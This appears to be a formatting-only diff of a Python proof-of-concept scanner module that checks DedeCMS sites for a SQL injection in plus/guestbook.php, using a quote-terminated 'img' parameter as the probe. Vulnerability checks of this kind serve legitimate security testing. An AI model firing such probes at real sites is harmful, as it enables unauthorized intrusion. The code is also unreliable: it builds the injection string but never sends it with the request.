@@ -3,11 +3,12 @@
 from CScanPoc.thirdparty import requests
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 
+
 class Vuln(ABVuln):
-    vuln_id = 'DedeCMS_0043_p' # 平台漏洞编号，留空
+    vuln_id = 'DedeCMS_0043_p'  # 平台漏洞编号，留空
     name = 'DedeCMS plus/guestbook.php sql注入'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.INJECTION # 漏洞类型
+    type = VulnType.INJECTION  # 漏洞类型
     disclosure_date = '2014-02-26'  # 漏洞公布时间
     desc = '''
         DedeCMS 在/plus/guestbook.php中存在注入漏洞，可直接发布留言。
@@ -31,14 +32,14 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
-            #把Sverification_code改成你的验证码就哦了
+
+            # 把Sverification_code改成你的验证码就哦了
             verification_code = 'aaaa'
             payload = '/dede/plus/guestbook.php'
             data = "?action=save&validate={verification_code}&msg=1&uname=1&img=111'".format(
                 verification_code=verification_code)
             url = self.target + payload
-            r = requests.get(url) 
+            r = requests.get(url)
 
             if r.status_code == 200 and '111' in r.text and u'留言发布成功' in r.text:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
@@ -49,6 +50,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
